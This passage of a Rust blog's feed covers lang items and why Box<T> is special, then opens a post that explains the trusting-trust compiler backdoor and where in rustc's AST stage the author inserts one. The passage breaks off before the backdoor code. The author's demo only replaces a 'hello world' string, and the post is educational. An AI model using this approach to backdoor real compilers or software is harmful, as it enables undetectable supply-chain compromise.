<code>"panic_bounds_check"</code> is used for out of bounds indexing panics on slices. The last one,
<code>"panic_fmt"</code> hooks into a function defined later in libstd.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L336-L337"><code>"exchange_malloc"</code> and <code>"box_free"</code></a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/liballoc/heap.rs#L129-L152">alloc</a>) are for
telling the compiler which functions to call in case it needs to do a <code>malloc()</code> or <code>free()</code>. These
are used when constructing <code>Box&lt;T&gt;</code> via placement <code>box</code> syntax and when moving out of a deref of a
box.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L338"><code>"strdup_uniq"</code></a> seemed to be used in the past for moving string literals to the heap,
but is no longer used.</p>

<p>We&rsquo;ve already seen <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L340">the start lang item</a> (<a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/libstd/rt.rs#L31-L67">std</a>) being used in our
minimal example program. This function is basically where you find Rust&rsquo;s &ldquo;runtime&rdquo;: it gets called
with a pointer to main and the command line arguments, it sets up the &ldquo;runtime&rdquo;, calls main, and
tears down anything it needs to. Rust has a C-like minimal runtime, so
<a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/libstd/rt.rs#L31-L67">the actual libstd definition</a> doesn&rsquo;t do much.
But you theoretically could stick a very heavy runtime initialization routine here.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L342-L344">exception handling lang items</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libpanic_unwind/seh.rs">panic_unwind</a>, in multiple
platform-specific modules) specify various bits of the exception handling behavior. These hooks are
called during various steps of unwinding: <code>eh_personality</code> is called when determining whether
or not to stop at a stack frame or unwind up to the next one. <code>eh_unwind_resume</code> is the routine
called when the unwinding code wishes to resume unwinding after calling destructors in a landing
pad. <code>msvc_try_filter</code> defines some parameter that MSVC needs in its unwinding code. I don&rsquo;t
understand it, and apparently, <a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libpanic_unwind/seh.rs#L232">neither does the person who wrote it</a>.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L346"><code>"owned_box"</code></a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/liballoc/boxed.rs#L105-L107">alloc</a>) lang item tells the compiler which type is
the <code>Box</code> type. In my previous post I covered how <code>Box</code> is special; this lang item is how the
compiler finds impls on <code>Box</code> and knows what the type is. Unlike the other primitives, <code>Box</code> doesn&rsquo;t
actually have a type name (like <code>bool</code>) that can be used if you&rsquo;re writing libcore or libstd. This
lang item gives <code>Box</code> a type name that can be used to refer to it. (It also defines some,
but not all, of the semantics of <code>Box&lt;T&gt;</code>)</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L348"><code>"phantom_data"</code></a> (<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/marker.rs#L544-L546">core</a>) type itself is allowed to have
an unused type parameter, and it can be used to help fix the variance and drop behavior
of a generic type. More on this in <a href="https://doc.rust-lang.org/nomicon/phantom-data.html">the nomicon</a>.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L360"><code>"non_zero"</code></a> lang item (<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/nonzero.rs#L38-L42">core</a>) marks the <code>NonZero&lt;T&gt;</code> type,
a type which is guaranteed to never contain a bit pattern of only zeroes. This is used inside things
like <code>Rc&lt;T&gt;</code> and <code>Box&lt;T&gt;</code> &ndash; we know that the pointers in these can/should never be null, so they
contain a <code>NonZero&lt;*const T&gt;</code>. When used inside an enum like <code>Option&lt;Rc&lt;T&gt;&gt;</code>, the discriminant
(the &ldquo;tag&rdquo; value that distinguishes between <code>Some</code> and <code>None</code>) is no longer necessary, since
we can mark the <code>None</code> case as the case where the bits occupied by <code>NonZero</code> in the <code>Some</code> case
are zero. Beware, this optimization also applies to C-like enums that don&rsquo;t have a variant
corresponding to a discriminant value of zero (unless they are <code>#[repr(C)]</code>)</p>

<p>There are also a bunch of deprecated lang items there. For example, <code>NoCopy</code> used to be a struct
that could be dropped within a type to make it not implement <code>Copy</code>; in the past <code>Copy</code>
implementations were automatic like <code>Send</code> and <code>Sync</code> are today. <code>NoCopy</code> was the way to opt out.
There also used to be <code>NoSend</code> and <code>NoSync</code>. <code>CovariantType</code>/<code>CovariantLifetime</code>/etc were the
predecessors of <code>PhantomData</code>; they could be used to specify variance relations of a type with its
type or lifetime parameters, but you can now do this with providing the right <code>PhantomData</code>, e.g.
<code>InvariantType&lt;T&gt;</code> is now <code>PhantomData&lt;Cell&lt;T&gt;&gt;</code>.
The <a href="https://doc.rust-lang.org/nomicon/subtyping.html">nomicon</a> has more on variance. I don&rsquo;t know why these lang items haven&rsquo;t been
removed (they don&rsquo;t work anymore anyway); the only consumer of them is libcore so &ldquo;deprecating&rdquo; them
seems unnecessary. It&rsquo;s probably an oversight.</p>

<p>Interestingly, <code>Iterator</code> and <code>IntoIterator</code> are <em>not</em> lang items, even though they are used in <code>for</code>
loops. Instead, the compiler inserts hardcoded calls to <code>::std::iter::IntoIterator::into_iter</code> and
<code>::std::iter::Iterator::next</code>, and a hardcoded reference to <code>::std::option::Option</code> (The paths use
<code>core</code> in <code>no_std</code> mode). This is probably because the compiler desugars <code>for</code> loops before type
resolution is done, so withut this, libcore would not be able to use for loops since the compiler
wouldn&rsquo;t know what calls to insert in place of the loops while compiling.</p>

<hr />

<p>Basically, whenever the compiler needs to use special treatment with an item &ndash; whether it be
dispatching calls to functions and trait methods in various situations, conferring special semantics
to types/traits, or requiring traits to be implemented, the type will be defined in the standard
library (libstd, libcore, or one of the crates behind the libstd faรงade), and marked as a lang item.</p>

<p>Some of the lang items are useful/necessary when working without libstd. Most only come into play if
you want to replace libcore, which is a pretty niche thing to do, and knowing about them is rarely
useful outside of the realm of compiler hacking.</p>

<p>But, like with the <code>Box&lt;T&gt;</code> madness, I still find this quite interesting, even if it isn&rsquo;t generally
useful!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Though as we learned in the previous post, when <code>x</code> and <code>y</code> are known numeric types it will bypass the trait and directly generate an add instruction in LLVM<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>To be clear, I&rsquo;m not aware of any plans to eventually stabilize this. It&rsquo;s something that could happen.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Rust Tidbits: Box Is Special]]></title>
    <link href="http://manishearth.github.io/blog/2017/01/10/rust-tidbits-box-is-special/"/>
    <updated>2017-01-10T22:59:43-08:00</updated>
    <id>http://manishearth.github.io/blog/2017/01/10/rust-tidbits-box-is-special</id>
    <content type="html"><![CDATA[<p>Rust is not a simple language. As with any such language, it has many little tidbits of complexity
that most folks aren&rsquo;t aware of. Many of these tidbits are ones which may not practically matter
much for everyday Rust programming, but are interesting to know. Others may be more useful. I&rsquo;ve
found that a lot of these aren&rsquo;t documented anywhere (not that they always should be), and sometimes
depend on knowledge of compiler internals or history. As a fan of programming trivia myself, I&rsquo;ve
decided to try writing about these things whenever I come across them. &ldquo;Tribal Knowledge&rdquo; shouldn&rsquo;t
be a thing in a programming community; and trivia is fun!</p>

<hr />

<p>So. <code>Box&lt;T&gt;</code>. Your favorite heap allocation type that nobody uses<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<p>I was discussing some stuff on the rfcs repo when
<a href="https://github.com/rust-lang/rfcs/issues/1850#issuecomment-271766300">@burdges realized that <code>Box&lt;T&gt;</code> has a funky <code>Deref</code> impl</a>.</p>

<p>Let&rsquo;s <a href="https://github.com/rust-lang/rust/blob/e4fee525e04838dabc82beed5ae1a06051be53fd/src/liballoc/boxed.rs#L502">look at it</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="cp">#[stable(feature = </span><span class="s">&quot;rust1&quot;</span><span class="cp">, since = </span><span class="s">&quot;1.0.0&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="o">?</span><span class="nb">Sized</span><span class="o">&gt;</span> <span class="n">Deref</span> <span class="k">for</span> <span class="n">Box</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Target</span> <span class="o">=</span> <span class="n">T</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">fn</span> <span class="n">deref</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="n">T</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;**</span><span class="bp">self</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#[stable(feature = </span><span class="s">&quot;rust1&quot;</span><span class="cp">, since = </span><span class="s">&quot;1.0.0&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="o">?</span><span class="nb">Sized</span><span class="o">&gt;</span> <span class="n">DerefMut</span> <span class="k">for</span> <span class="n">Box</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">deref_mut</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">T</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;</span><span class="k">mut</span> <span class="o">**</span><span class="bp">self</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Wait, what? <em>Squints</em></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">fn</span> <span class="n">deref</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="n">T</span> <span class="p">{</span>
</span><span class='line'>    <span class="o">&amp;**</span><span class="bp">self</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>The call is coming from inside the house!</em></p>

<p>In case you didn&rsquo;t realize it, this deref impl returns <code>&amp;**self</code> &ndash; since <code>self</code>
is an <code>&amp;Box&lt;T&gt;</code>, dereferencing it once will provide a <code>Box&lt;T&gt;</code>, and the second dereference
will dereference the box to provide a <code>T</code>. We then wrap it in a reference and return it.</p>

<p>But wait, we are <em>defining</em> how a <code>Box&lt;T&gt;</code> is to be dereferenced (that&rsquo;s what <code>Deref::deref</code> is
for!), such a definition cannot itself dereference a <code>Box&lt;T&gt;</code>! That&rsquo;s infinite recursion.</p>

<p>And indeed. For any other type such a <code>deref</code> impl would recurse infinitely. If you run
<a href="https://play.rust-lang.org/?gist=9c8a02336c6816e57c83de39c103ca06&amp;version=stable&amp;backtrace=0">this code</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">use</span> <span class="n">std</span><span class="o">::</span><span class="n">ops</span><span class="o">::</span><span class="n">Deref</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">LolBox</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="p">(</span><span class="n">T</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">Deref</span> <span class="k">for</span> <span class="n">LolBox</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Target</span> <span class="o">=</span> <span class="n">T</span><span class="p">;</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">deref</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="n">T</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;**</span><span class="bp">self</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>the compiler will warn you:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>warning: function cannot return without recurring, #[warn(unconditional_recursion)] on by default
</span><span class='line'> --&gt; &lt;anon&gt;:7:5
</span><span class='line'>  |
</span><span class='line'>7 |     fn deref(&amp;self) -&gt; &amp;T {
</span><span class='line'>  |     ^
</span><span class='line'>  |
</span><span class='line'>note: recursive call site
</span><span class='line'> --&gt; &lt;anon&gt;:8:10
</span><span class='line'>  |
</span><span class='line'>8 |         &amp;**self
</span><span class='line'>  |          ^^^^^^
</span><span class='line'>  = help: a `loop` may express intention better if this is on purpose
</span></code></pre></td></tr></table></div></figure>


<p>Actually trying to dereference the type will lead to a stack overflow.</p>

<p>Clearly something is fishy here. This deref impl is similar to <a href="https://github.com/rust-lang/rust/blob/52c03d1d619fd25c961bc9de59bcc942b660d5db/src/libcore/ops.rs#L2460">the deref impl for <code>&amp;T</code></a>,
or the <a href="https://github.com/rust-lang/rust/blob/52c03d1d619fd25c961bc9de59bcc942b660d5db/src/libcore/ops.rs#L263"><code>Add</code> impl for number types</a>, or any other of the implementations of operators on
primitive types. For example we literally
<a href="https://github.com/rust-lang/rust/blob/52c03d1d619fd25c961bc9de59bcc942b660d5db/src/libcore/ops.rs#L263">define <code>Add</code> on two integers to be their addition</a>. The reason these impls need to exist
is so that people can still call <code>Add::add</code> if they need to in generic code and be able to pass
integers to things with an <code>Add</code> bound. But the compiler knows how to use builtin operators on
numbers and dereference borrowed references without these impls. But those are primitive types
which are defined in the compiler, while <code>Box&lt;T&gt;</code> is just a regular smart pointer struct, right?</p>

<p>Turns out, <code>Box&lt;T&gt;</code> is special. It, too, is somewhat of a primitive type.</p>

<p>This is partly due to historical accident.</p>

<p>To understand this, we must look back to Ye Olde days of pre-1.0 Rust (ca 2014). Back in these days,
we had none of this newfangled &ldquo;stability&rdquo; business. The compiler broke your code every two weeks.
Of course, you wouldn&rsquo;t <em>know</em> that because the compiler would usually crash before it could tell
you that your code was broken! Sigils roamed the lands freely, and cargo was but a newborn child
which was destined to eventually end the tyranny of Makefiles. People were largely happy knowing
that their closures were safely boxed and their threads sufficiently green.</p>

<p>Back in these days, we didn&rsquo;t have <code>Box&lt;T&gt;</code>, <code>Vec&lt;T&gt;</code>, or <code>String</code>. We had <code>~T</code>, <code>~[T]</code>, and <code>~str</code>.
The second two are <em>not</em> equivalent to <code>Box&lt;[T]&gt;</code> and <code>Box&lt;str&gt;</code>, even though they may look like it,
they are both growable containers like <code>Vec&lt;T&gt;</code> and <code>String</code>. <code>~</code> conceptually meant &ldquo;owned&rdquo;, though
IMO that caused more confusion than it was worth.</p>

<p>You created a box using the <code>~</code> operator, e.g. <code>let x = ~1;</code>. It could be dereferenced with the <code>*</code>
operator, and autoderef worked much like it does today.</p>

<p>As a &ldquo;primitive&rdquo; type; like all primitive types, <code>~T</code> was special. The compiler knew things about
it. The compiler knew how to dereference it without an explicit <code>Deref</code> impl. In fact, the <code>Deref</code>
traits <a href="https://github.com/rust-lang/rust/pull/12491">came into existence</a> much after <code>~T</code> did. <code>~T</code> never got an explicit <code>Deref</code> impl,
though it probably should have.</p>

<p>Eventually, there was a move to remove sigils from the language. The box constructor <code>~foo</code> was
superseded by <a href="https://github.com/rust-lang/rust/pull/11055/">placement <code>box</code> syntax</a>, which still exists in Rust nightly<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. Then, the
<a href="https://github.com/rust-lang/rust/pull/13904"><code>~T</code> type became <code>Box&lt;T&gt;</code></a>. (<code>~[T]</code> and <code>~str</code> would also be removed, though <code>~str</code> took
a very confusing detour with <code>StrBuf</code> first).</p>

<p>However, <code>Box&lt;T&gt;</code> was still special. It no longer needed special syntax to be referred to or
constructed, but it was still internally a special type. It didn&rsquo;t even have a <code>Deref</code> impl yet,
that came <a href="https://github.com/rust-lang/rust/pull/20052">six months later</a>, and it was implemented as <code>&amp;**self</code>, exactly the same
as it is today.</p>

<p>But why does it <em>have</em> to be special now? Rust had all the features it needed (allocations,
ownership, overloadable deref) to implement <code>Box&lt;T&gt;</code> in pure rust in the stdlib as if it
were a regular type.</p>

<p>Turns out that Rust didn&rsquo;t. You see, because <code>Box&lt;T&gt;</code> and before it <code>~T</code> were special, their
dereference semantics were implemented in a different part of the code. And, these semantics were
not the same as the ones for <code>DerefImm</code> and <code>DerefMut</code>, which were created for use with other smart
pointers. I don&rsquo;t know if the possibility of being used for <code>~T</code> was considered when
<code>DerefImm</code>/<code>DerefMut</code> were being implemented, or if it was a simple oversight, but <code>Box&lt;T&gt;</code> has
three pieces of behavior that could not be replicated in pure Rust at the time:</p>

<ul>
<li><code>box foo</code> in a pattern would destructure a box into its contents. It&rsquo;s somewhat the opposite of <code>ref</code></li>
<li><code>box foo()</code> performed placement box, so the result of <code>foo()</code> could be directly written to a preallocated box, reducing extraneous copies</li>
<li>You could <em>move out of deref</em> with <code>Box&lt;T&gt;</code></li>
</ul>


<p>The third one is the one that really gets to us here<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>.
For a <em>regular</em> type, <code>*foo</code> will produce a temporary that must be immediately borrowed or copied.
You cannot do <code>let x = *y</code> for a non-<code>Copy</code> type. This dereference operation will call
<code>DerefMut::deref_mut</code> or <code>Deref::deref</code> based on how it gets borrowed. With <code>Box&lt;T&gt;</code>, you can do
this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Box</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">]);</span>
</span><span class='line'><span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span><span class="p">;</span> <span class="c1">// moves the vec out into `y`, then deallocates the box</span>
</span><span class='line'>            <span class="c1">// but does not call a destructor on the vec</span>
</span></code></pre></td></tr></table></div></figure>


<p>For any other type, such an operation will produce a &ldquo;cannot move out of a borrow&rdquo; error.</p>

<p>This operation is colloquially called <code>DerefMove</code>, and there has been <a href="https://github.com/rust-lang/rfcs/pull/178/files?short_path=6f69a99#diff-6f69a990502a98c2eeb172d87269005d">an rfc</a> in the
past for making it into a trait. I suspect that the <code>DerefMove</code> semantics could even have been
removed from <code>Box&lt;T&gt;</code> before 1.0 (I don&rsquo;t find it <em>necessary</em>), but people had better things to do,
like fixing the million other rough edges of the language that can&rsquo;t be touched after backwards
compatibility is a thing.</p>

<p>So now we&rsquo;re stuck with it. The current status is that <code>Box&lt;T&gt;</code> is <em>still</em> a special type in the
compiler. By &ldquo;special type&rdquo; I don&rsquo;t just mean that the compiler treats it a bit differently (this is
true for any lang item), I mean that it literally is treated as
<a href="http://manishearth.github.io/rust-internals-docs/rustc/ty/enum.TypeVariants.html#TyBox.v">a completely new kind of type</a>, not as a struct the way it has been defined in liballoc.
There&rsquo;s a TON of cruft in the compiler related to this type, much of which can be removed, but some
of which can&rsquo;t. If we ever do get <code>DerefMove</code>, we should probably try removing it all again. After
writing this post I&rsquo;m half-convinced to try and implement an internal-use-only <code>DerefMove</code> and try
cleaning up the code myself.</p>

<p>Most of this isn&rsquo;t really useful to know unless you actually come across a case where you can make
use of <code>DerefMove</code> semantics, or if you work on the compiler. But it certainly is interesting!</p>

<p>Next post: <a href="http://manishearth.github.io/blog/2017/01/11/rust-tidbits-what-is-a-lang-item/">What is a lang item?</a></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Seriously though, does anyone use it much? I&rsquo;ve only seen it getting used for boxed DSTs (trait objects and boxed slices), which themselves are pretty rare, for sending heap types over FFI, recursive types (rare), and random special cases. I find this pretty interesting given that other languages are much more liberal with non-refcounted single-element allocation.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>It will probably eventually be replaced or made equivalent to the <code>&lt;-</code> syntax before stabilizing<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>It&rsquo;s easier to special case the first two, much like how <code>for</code> loops are aware of the iterator trait without the iterator trait being extremely special cased<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Reflections on Rusting Trust]]></title>
    <link href="http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust/"/>
    <updated>2016-12-02T11:28:27-08:00</updated>
    <id>http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust</id>
    <content type="html"><![CDATA[<p>The Rust compiler is written in Rust. This is overall a pretty common practice in compiler
development. This usually means that the process of building the compiler involves downloading a
(typically) older version of the compiler.</p>

<p>This also means that the compiler is vulnerable to what is colloquially known as the &ldquo;Trusting
Trust&rdquo; attack, an attack described in <a href="https://www.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf">Ken Thompson&rsquo;s acceptance speech for the 1983 Turing Award</a>.
This kind of thing fascinates me, so I decided to try writing one myself. It&rsquo;s stuff like this which
started my interest in compilers, and I hope this post can help get others interested the same way.</p>

<p>To be clear, this isn&rsquo;t an indictment of Rust&rsquo;s security. Quite a few languages out there have
popular self-hosted compilers (C, C++, Haskell, Scala, D, Go) and are vulnerable to this attack. For
this attack to have any effect, one needs to be able to uniformly distribute this compiler, and
there are roughly equivalent ways of doing the same level of damage with that kind of access.</p>

<p>If you already know what a trusting trust attack is, you can skip the next section. If you just want
to see the code, it&rsquo;s in the <a href="https://github.com/Manishearth/rust/tree/rusting-trust">trusting-trust branch</a> on my Rust fork, specifically
<a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this code</a>.</p>

<h2>The attack</h2>

<p>The essence of the attack is this:</p>

<p>An attacker can conceivably change a compiler such that it can detect a particular kind of application and
make malicious changes to it. The example given in the talk was the UNIX <code>login</code> program &mdash; the attacker
can tweak a compiler so as to detect that it is compiling the <code>login</code> program, and compile in a
backdoor that lets it unconditionally accept a special password (created by the attacker) for any
user, thereby giving the attacker access to all accounts on all systems that have <code>login</code> compiled
by their modified compiler.</p>

<p>However, this change would be detected in the source. If it was not included in the source, this
change would disappear in the next release of the compiler, or when someone else compiles the
compiler from source. Avoiding this attack is easily done by compiling your own compilers and not
downloading untrusted binaries. This is good advice in general regarding untrusted binaries, and it
equally applies here.</p>

<p>To counter this, the attacker can go one step further. If they can tweak the compiler so as to
backdoor <code>login</code>, they could also tweak the compiler so as to backdoor itself. The attacker needs to
modify the compiler with a backdoor which detects when it is compiling the same compiler, and
introduces <em>itself</em> into the compiler that it is compiling. On top of this it can also introduce
backdoors into <code>login</code> or whatever other program the attacker is interested in.</p>

<p>Now, in this case, even if the backdoor is removed from the source, <em>every compiler compiled using
this backdoored compiler will be similarly backdoored</em>. So if this backdoored compiler somehow
starts getting distributed, it will spread itself as it is used to compile more copies of itself
(e.g. newer versions, etc). And it will be virtually undetectable &mdash; since the source doesn&rsquo;t
need to be modified for it to work; just the non-human-readable binary.</p>

<p>Of course, there are ways to protect against this. Ultimately, before a compiler for language X
existed, that compiler had to be written in some other language Y. If you can track the sources back
to that point you can bootstrap a working compiler from scratch and keep compiling newer compiler
versions till you reach the present. This raises the question of whether or not Y&rsquo;s compiler is
backdoored. While it sounds pretty unlikely that such a backdoor could be so robust as to work on
two different compilers and stay put throughout the history of X, you can of course trace back Y
back to other languages and so on till you find a compiler in assembly that you can verify<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<h2>Backdooring Rust</h2>

<p>Alright, so I want to backdoor my compiler. I first have to decide when in the pipeline the code
that insert backdoors executes. The Rust compiler operates by taking source code, parsing it into a
syntax tree (AST), transforming it into some intermediate representations (HIR and MIR), and feeding
it to LLVM in the form of LLVM IR, after which LLVM does its thing and creates binaries. A backdoor
can be inserted at any point in this stage. To me, it seems like it&rsquo;s easier to insert one into the
AST, because it&rsquo;s easier to obtain AST from source, and this is important as we&rsquo;ll see soon. It also
makes this attack less practically viable<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>, which is nice since this is just a fun exercise and I
don&rsquo;t actually want to backdoor the compiler.</p>

<p>So the moment the compiler finishes parsing, my code will modify the AST to insert a backdoor.</p>

<p>First, I&rsquo;ll try to write a simpler backdoor; one which doesn&rsquo;t affect the compiler but instead
affects some programs. I shall write a backdoor that replaces occurrences of the string &ldquo;hello world&rdquo;
with &ldquo;เคเคเคพเคฒเคพ เคจเคฎเคธเฅเคเคพเคฐ&rdquo;, a rough translation of the same in my native language.</p>

<p>Now, in rustc, the <code>rustc_driver</code> crate is where the whole process of compiling is coordinated. In particular,
<a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L546"><code>phase_2_configure_and_expand</code></a> is run right after parsing (which is <a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L485">phase 1</a>). Perfect.
Within that function, the <code>krate</code> variable contains the parsed AST for the crate<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>, and we need to modify that.</p>

<p>In this case, there&rsquo;s already machinery in <a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/"><code>syntax::fold</code></a> for mutating ASTs based on patterns. A
<a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/trait.Folder.html"><code>Folder</code></a> basically has the ability to walk the AST, producing a mirror AST, with modifications. For
each kind of node, you get to specify a function which will produce a node to be used in its place.
Most such functions will default to no-op (returning the same node).</p>

<p>So I write the following <code>Folder</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
